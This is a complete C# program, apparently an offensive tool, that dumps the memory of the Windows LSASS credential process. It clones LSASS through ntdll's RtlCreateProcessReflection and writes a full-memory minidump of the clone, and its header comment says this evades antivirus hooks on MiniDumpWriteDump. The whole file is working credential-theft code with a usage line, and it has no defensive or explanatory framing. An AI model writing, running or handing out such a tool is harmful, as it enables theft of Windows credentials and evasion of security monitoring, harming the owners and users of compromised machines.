// RtlCreateProcessReflection LSASS dumper.
// Clones lsass into a "reflection" process via ntdll!RtlCreateProcessReflection,
// then dumps the reflection — MiniDumpWriteDump never touches lsass PID directly,
// evading AV hooks that monitor MiniDumpWriteDump(lsass_pid).
// Requires PROCESS_CREATE_THREAD|PROCESS_VM_OPERATION|PROCESS_DUP_HANDLE on lsass.
// Not PPL-safe.
// Usage: rtlcp-dumper.exe <output_path>
using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using DWORD  = System.Int32;
using BOOL   = System.Int32;
using HANDLE = System.IntPtr;
using PVOID  = System.IntPtr;

namespace RtlcpDumper
{
    [StructLayout(LayoutKind.Sequential)]
    struct RTLP_PROCESS_REFLECTION_INFORMATION
    {
        public HANDLE ReflectionProcessHandle;
        public HANDLE ReflectionThreadHandle;
        public IntPtr ClientIdProcess; // CLIENT_ID.UniqueProcess
        public IntPtr ClientIdThread;  // CLIENT_ID.UniqueThread
    }

    [Flags]
    enum MINIDUMP_TYPE : int
    {
        MiniDumpWithDataSegs       = 0x00000001,
        MiniDumpWithFullMemory     = 0x00000002,
        MiniDumpWithHandleData     = 0x00000004,
        MiniDumpWithUnloadedModules= 0x00000020,
        MiniDumpWithFullMemoryInfo = 0x00000800,
        MiniDumpWithThreadInfo     = 0x00001000,
        MiniDumpWithModuleHeaders  = 0x00080000,
    }

    class Program
    {
        // PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_DUP_HANDLE
        const uint REFLECTION_ACCESS = 0x0002 | 0x0008 | 0x0040;

        // RTL_CLONE_PROCESS_FLAGS_INHERIT_HANDLES = 0x2
        const uint RTL_CLONE_INHERIT_HANDLES = 0x00000002;

        [DllImport("kernel32")] static extern HANDLE OpenProcess(uint dwAccess, BOOL bInherit, DWORD dwPid);
        [DllImport("kernel32")] static extern BOOL   CloseHandle(HANDLE h);
        [DllImport("kernel32")] static extern BOOL   TerminateProcess(HANDLE h, uint exitCode);
        [DllImport("ntdll")]
        static extern int RtlCreateProcessReflection(
            HANDLE ProcessHandle, uint Flags,
            PVOID StartRoutine, PVOID StartContext, HANDLE EventHandle,
            out RTLP_PROCESS_REFLECTION_INFORMATION ReflectionInfo);
        [DllImport("dbghelp", SetLastError = true)]
        static extern BOOL MiniDumpWriteDump(HANDLE hProcess, DWORD pid, HANDLE hFile,
            MINIDUMP_TYPE dumpType, IntPtr exInfo, IntPtr userStream, IntPtr cbParam);

        static int Main(string[] args)
        {
            if (args.Length < 1) { Console.Error.WriteLine("usage: rtlcp-dumper.exe <out.dmp>"); return 1; }
            string outPath = args[0];

            Process[] procs = Process.GetProcessesByName("lsass");
            if (procs.Length == 0) { Console.Error.WriteLine("lsass not found"); return 1; }
            int pid = procs[0].Id;

            HANDLE hProc = OpenProcess(REFLECTION_ACCESS, 0, pid);
            if (hProc == IntPtr.Zero)
            {
                Console.Error.WriteLine("OpenProcess failed: " + Marshal.GetLastWin32Error());
                return 1;
            }

            RTLP_PROCESS_REFLECTION_INFORMATION info;
            int status = RtlCreateProcessReflection(hProc, RTL_CLONE_INHERIT_HANDLES,
                IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, out info);

            if (status != 0)
            {
                Console.Error.WriteLine("RtlCreateProcessReflection failed: 0x" + ((uint)status).ToString("X8"));
                CloseHandle(hProc);
                return 1;
            }

            int ret = 0;
            try
            {
                using (var fs = new FileStream(outPath, FileMode.Create, FileAccess.ReadWrite, FileShare.None))
                {
                    var dumpType = MINIDUMP_TYPE.MiniDumpWithDataSegs
                                 | MINIDUMP_TYPE.MiniDumpWithFullMemory
                                 | MINIDUMP_TYPE.MiniDumpWithHandleData
                                 | MINIDUMP_TYPE.MiniDumpWithUnloadedModules
                                 | MINIDUMP_TYPE.MiniDumpWithFullMemoryInfo
                                 | MINIDUMP_TYPE.MiniDumpWithThreadInfo
                                 | MINIDUMP_TYPE.MiniDumpWithModuleHeaders;

                    // Dump the reflection, not lsass itself
                    BOOL ok = MiniDumpWriteDump(info.ReflectionProcessHandle, (DWORD)pid,
                        fs.SafeFileHandle.DangerousGetHandle(), dumpType,
                        IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);

                    if (ok == 0)
                    {
                        Console.Error.WriteLine("MiniDumpWriteDump failed: 0x" + Marshal.GetHRForLastWin32Error().ToString("X"));
                        ret = 1;
                    }
                    else
                    {
                        Console.WriteLine("OK: " + outPath);
                    }
                }
            }
            catch (Exception ex)
            {
                Console.Error.WriteLine("Exception: " + ex.Message);
                ret = 1;
            }
            finally
            {
                TerminateProcess(info.ReflectionProcessHandle, 0);
                CloseHandle(info.ReflectionProcessHandle);
                CloseHandle(info.ReflectionThreadHandle);
                CloseHandle(hProc);
            }
            return ret;
        }
    }
}
